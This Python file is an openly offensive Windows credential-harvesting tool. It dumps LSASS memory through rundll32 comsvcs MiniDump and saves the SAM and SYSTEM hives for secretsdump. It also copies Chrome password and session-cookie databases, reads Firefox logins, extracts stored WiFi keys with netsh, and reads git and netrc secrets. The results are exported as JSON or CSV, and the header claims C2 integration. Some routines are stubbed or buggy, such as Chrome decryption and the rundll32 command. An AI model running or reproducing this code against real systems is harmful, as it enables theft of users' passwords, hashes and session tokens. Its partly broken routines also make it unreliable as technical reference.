#!/usr/bin/env python3
"""
Advanced Credential Harvesting Suite
Extracts credentials from LSASS, SAM/SECURITY, browsers, credential managers,
WiFi, git, RDP cache, email clients. Windows-focused; integrates with C2.
"""

import subprocess
import json
import os
import re
import base64
import sqlite3
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from pathlib import Path
from enum import Enum
import hashlib


class CredentialType(Enum):
    """Types of credentials harvested."""
    WINDOWS_LOGON = "windows_logon"
    LSASS_DUMP = "lsass_dump"
    SAM_HASH = "sam_hash"
    BROWSER_PASSWORD = "browser_password"
    BROWSER_COOKIE = "browser_cookie"
    CREDENTIAL_MANAGER = "credential_manager"
    WIFI_PASSWORD = "wifi_password"
    VPN_CREDENTIAL = "vpn_credential"
    RDP_CREDENTIAL = "rdp_credential"
    GIT_CREDENTIAL = "git_credential"
    SMTP_CREDENTIAL = "smtp_credential"
    DATABASE_CREDENTIAL = "database_credential"
    SSH_KEY = "ssh_key"
    CLOUD_TOKEN = "cloud_token"


@dataclass
class Credential:
    """Harvested credential."""
    type: CredentialType
    username: str
    password: Optional[str] = None
    hash_value: Optional[str] = None
    hash_type: Optional[str] = None  # NTLM, MD5, bcrypt, etc.
    domain: Optional[str] = None
    service: Optional[str] = None  # Chrome, Firefox, WiFi, etc.
    metadata: Dict = field(default_factory=dict)
    source: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "type": self.type.value,
            "username": self.username,
            "password": self.password,
            "hash": self.hash_value,
            "hash_type": self.hash_type,
            "domain": self.domain,
            "service": self.service,
            "metadata": self.metadata,
            "source": self.source,
            "timestamp": self.timestamp,
        }


class LSASSExtractor:
    """Extract credentials from LSASS memory."""
    
    @staticmethod
    def dump_lsass() -> Optional[str]:
        """Dump LSASS process memory to file."""
        try:
            # Use Task Manager or rundll32 approach (requires admin)
            dump_path = r"C:\Windows\Temp\lsass.dmp"
            cmd = f'tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "lsass.exe" not in result.stdout:
                return None
            
            # Attempt dump via rundll32 + comsvcs (MiniDumpWriteDump)
            cmd = (
                f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, '
                f'MiniDump (Get-Process lsass).Id {dump_path} full'
            )
            subprocess.run(cmd, shell=True, capture_output=True)
            
            if os.path.exists(dump_path):
                return dump_path
            return None
        except Exception:
            return None
    
    @staticmethod
    def extract_credentials_from_dump(dump_path: str) -> List[Credential]:
        """Parse LSASS dump (requires pypykatz or Impacket)."""
        credentials = []
        try:
            # Try pypykatz: pip install pypykatz
            from pypykatz.lsadump import lsadump
            mimi = lsadump.parse_lsassdump(dump_path)
            
            for domain_name, domain_info in mimi.items():
                for user_name, user_info in domain_info.items():
                    # NT hash
                    if hasattr(user_info, 'nt_hash') and user_info.nt_hash:
                        credentials.append(Credential(
                            type=CredentialType.LSASS_DUMP,
                            username=user_name,
                            hash_value=user_info.nt_hash.hex(),
                            hash_type="NTLM",
                            domain=domain_name,
                            source="LSASS dump",
                        ))
                    
                    # LM hash
                    if hasattr(user_info, 'lm_hash') and user_info.lm_hash:
                        credentials.append(Credential(
                            type=CredentialType.LSASS_DUMP,
                            username=user_name,
                            hash_value=user_info.lm_hash.hex(),
                            hash_type="LM",
                            domain=domain_name,
                            source="LSASS dump",
                        ))
        except Exception:
            pass
        
        return credentials


class RegistryExtractor:
    """Extract credentials from Windows registry."""
    
    @staticmethod
    def extract_sam_hashes() -> List[Credential]:
        """Extract SAM hashes (requires admin + System context)."""
        credentials = []
        try:
            # Dump SAM and SYSTEM registry hives
            cmd_sam = 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.reg'
            cmd_system = 'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.reg'
            
            subprocess.run(cmd_sam, shell=True, capture_output=True)
            subprocess.run(cmd_system, shell=True, capture_output=True)
            
            # Parse with secretsdump.py (impacket)
            cmd = (
                'secretsdump.py -sam C:\\Windows\\Temp\\sam.reg '
                '-system C:\\Windows\\Temp\\system.reg LOCAL'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Parse output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:81f5e21e35407d884571545fd50ec20a:::
            for line in result.stdout.split('\n'):
                if ':' in line and '500:' in line or '501:' in line or '1000:' in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        username = parts[0]
                        lm_hash = parts[2]
                        ntlm_hash = parts[3]
                        
                        credentials.append(Credential(
                            type=CredentialType.SAM_HASH,
                            username=username,
                            hash_value=ntlm_hash,
                            hash_type="NTLM",
                            source="SAM registry",
                        ))
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def extract_rdp_cache() -> List[Credential]:
        """Extract RDP cached credentials from registry."""
        credentials = []
        try:
            cmd = (
                'reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Default" /s'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Parse: MRU items contain server IPs/hostnames
            for line in result.stdout.split('\n'):
                if 'MRU' in line:
                    server = line.split()[-1]
                    credentials.append(Credential(
                        type=CredentialType.RDP_CREDENTIAL,
                        username="[RDP Cache]",
                        service=server,
                        metadata={"cached_server": server},
                        source="RDP MRU cache",
                    ))
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def extract_credential_manager() -> List[Credential]:
        """Extract Windows Credential Manager vault."""
        credentials = []
        try:
            cmd = 'cmdkey /list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Parse: "Target: Domain:target=server.com"
            current_target = None
            for line in result.stdout.split('\n'):
                if 'Target:' in line:
                    current_target = line.split('Target:')[1].strip()
                elif 'User:' in line and current_target:
                    username = line.split('User:')[1].strip()
                    credentials.append(Credential(
                        type=CredentialType.CREDENTIAL_MANAGER,
                        username=username,
                        service=current_target,
                        source="Credential Manager",
                    ))
        except Exception:
            pass
        
        return credentials


class BrowserExtractor:
    """Extract credentials from browsers."""
    
    @staticmethod
    def extract_chrome() -> List[Credential]:
        """Extract passwords from Chrome/Chromium."""
        credentials = []
        chrome_path = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
        
        if not chrome_path.exists():
            return credentials
        
        try:
            # Copy database (it's locked while Chrome runs)
            import shutil
            temp_db = r"C:\Windows\Temp\chrome_login.db"
            shutil.copy(str(chrome_path), temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for origin, username, password_encrypted in cursor.fetchall():
                # Password is encrypted with DPAPI on Windows
                # Decryption requires decryptor module (depends on Windows crypto)
                try:
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    
                    # Chrome uses DPAPI; this is simplified
                    password_plain = "[encrypted - requires DPAPI decryption]"
                except Exception:
                    password_plain = "[encrypted]"
                
                credentials.append(Credential(
                    type=CredentialType.BROWSER_PASSWORD,
                    username=username,
                    password=password_plain,
                    service=origin,
                    source="Chrome",
                ))
            
            conn.close()
            os.remove(temp_db)
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def extract_firefox() -> List[Credential]:
        """Extract passwords from Firefox."""
        credentials = []
        firefox_path = Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
        
        if not firefox_path.exists():
            return credentials
        
        try:
            for profile in firefox_path.glob("*default*/"):
                login_file = profile / "logins.json"
                if login_file.exists():
                    with open(login_file, 'r') as f:
                        data = json.load(f)
                        for login in data.get("logins", []):
                            credentials.append(Credential(
                                type=CredentialType.BROWSER_PASSWORD,
                                username=login.get("usernameField", ""),
                                password=login.get("passwordField", "[encrypted]"),
                                service=login.get("hostname", ""),
                                source="Firefox",
                            ))
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def extract_cookies() -> List[Credential]:
        """Extract browser cookies (session tokens)."""
        credentials = []
        
        # Chrome cookies
        chrome_cookie_path = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
        if chrome_cookie_path.exists():
            try:
                import shutil
                temp_db = r"C:\Windows\Temp\chrome_cookies.db"
                shutil.copy(str(chrome_cookie_path), temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies WHERE name LIKE '%session%' OR name LIKE '%token%'")
                
                for host, name, value in cursor.fetchall():
                    credentials.append(Credential(
                        type=CredentialType.BROWSER_COOKIE,
                        username=name,
                        password=value,
                        service=host,
                        source="Chrome Cookies",
                    ))
                
                conn.close()
                os.remove(temp_db)
            except Exception:
                pass
        
        return credentials


class WiFiExtractor:
    """Extract WiFi passwords from Windows."""
    
    @staticmethod
    def extract_wifi_passwords() -> List[Credential]:
        """Extract stored WiFi passwords."""
        credentials = []
        try:
            # List all WiFi networks
            cmd = 'netsh wlan show profiles'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            networks = re.findall(r'All User Profile\s+:\s(.+)', result.stdout)
            
            for network in networks:
                network = network.strip()
                cmd = f'netsh wlan show profile name="{network}" key=clear'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                match = re.search(r'Key Content\s+:\s(.+)', result.stdout)
                if match:
                    password = match.group(1).strip()
                    credentials.append(Credential(
                        type=CredentialType.WIFI_PASSWORD,
                        username=network,
                        password=password,
                        service="WiFi",
                        source="WiFi Network",
                    ))
        except Exception:
            pass
        
        return credentials


class GitExtractor:
    """Extract git credentials."""
    
    @staticmethod
    def extract_git_credentials() -> List[Credential]:
        """Extract from .git-credentials, .gitconfig, netrc."""
        credentials = []
        
        # .git-credentials
        git_creds_path = Path.home() / ".git-credentials"
        if git_creds_path.exists():
            try:
                with open(git_creds_path, 'r') as f:
                    for line in f:
                        # Format: https://username:password@github.com
                        match = re.match(r'https://(.+):(.+)@(.+)', line)
                        if match:
                            username, password, domain = match.groups()
                            credentials.append(Credential(
                                type=CredentialType.GIT_CREDENTIAL,
                                username=username,
                                password=password,
                                service=domain,
                                source=".git-credentials",
                            ))
            except Exception:
                pass
        
        # .netrc
        netrc_path = Path.home() / ".netrc"
        if netrc_path.exists():
            try:
                with open(netrc_path, 'r') as f:
                    content = f.read()
                    for match in re.finditer(r'machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)', content):
                        machine, username, password = match.groups()
                        credentials.append(Credential(
                            type=CredentialType.GIT_CREDENTIAL,
                            username=username,
                            password=password,
                            service=machine,
                            source=".netrc",
                        ))
            except Exception:
                pass
        
        return credentials


class EmailExtractor:
    """Extract email client credentials."""
    
    @staticmethod
    def extract_outlook() -> List[Credential]:
        """Extract Outlook credentials from registry."""
        credentials = []
        try:
            cmd = r'reg query "HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles" /s'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Parse profile entries
            for line in result.stdout.split('\n'):
                if 'IMAPPassword' in line or 'SMTPPassword' in line or 'ExchangeServer' in line:
                    credentials.append(Credential(
                        type=CredentialType.SMTP_CREDENTIAL,
                        username="[Outlook]",
                        service="Outlook",
                        metadata={"raw": line},
                        source="Outlook registry",
                    ))
        except Exception:
            pass
        
        return credentials


class CredentialHarvester:
    """Main harvester: orchestrates all extraction methods."""
    
    def __init__(self):
        self.credentials: List[Credential] = []
    
    def harvest_all(self) -> List[Credential]:
        """Run all extraction methods."""
        # LSASS dump
        dump_path = LSASSExtractor.dump_lsass()
        if dump_path:
            self.credentials.extend(LSASSExtractor.extract_credentials_from_dump(dump_path))
        
        # Registry
        self.credentials.extend(RegistryExtractor.extract_sam_hashes())
        self.credentials.extend(RegistryExtractor.extract_rdp_cache())
        self.credentials.extend(RegistryExtractor.extract_credential_manager())
        
        # Browsers
        self.credentials.extend(BrowserExtractor.extract_chrome())
        self.credentials.extend(BrowserExtractor.extract_firefox())
        self.credentials.extend(BrowserExtractor.extract_cookies())
        
        # WiFi
        self.credentials.extend(WiFiExtractor.extract_wifi_passwords())
        
        # Git
        self.credentials.extend(GitExtractor.extract_git_credentials())
        
        # Email
        self.credentials.extend(EmailExtractor.extract_outlook())
        
        return self.credentials
    
    def export_json(self) -> str:
        """Export harvested credentials as JSON."""
        return json.dumps([c.to_dict() for c in self.credentials], indent=2)
    
    def export_csv(self) -> str:
        """Export as CSV for spreadsheet."""
        if not self.credentials:
            return ""
        
        lines = ["Type,Username,Password,Hash,Service,Domain,Source"]
        for cred in self.credentials:
            line = f"{cred.type.value},{cred.username},{cred.password or ''},{cred.hash_value or ''},{cred.service or ''},{cred.domain or ''},{cred.source}"
            lines.append(line)
        
        return "\n".join(lines)
    
    def filter_by_type(self, cred_type: CredentialType) -> List[Credential]:
        """Filter credentials by type."""
        return [c for c in self.credentials if c.type == cred_type]
    
    def filter_by_service(self, service: str) -> List[Credential]:
        """Filter by service (Chrome, WiFi, etc)."""
        return [c for c in self.credentials if service in (c.service or "")]


def main():
    """Demo: harvest all credentials."""
    harvester = CredentialHarvester()
    all_creds = harvester.harvest_all()
    
    print(f"[+] Harvested {len(all_creds)} credentials")
    print(f"\nCredentials by type:")
    for cred_type in CredentialType:
        filtered = harvester.filter_by_type(cred_type)
        if filtered:
            print(f"  {cred_type.value}: {len(filtered)}")
            for cred in filtered[:2]:
                print(f"    - {cred.username} @ {cred.service}")
    
    print(f"\n[+] Exporting to JSON...")
    print(harvester.export_json()[:500])


if __name__ == '__main__':
    main()
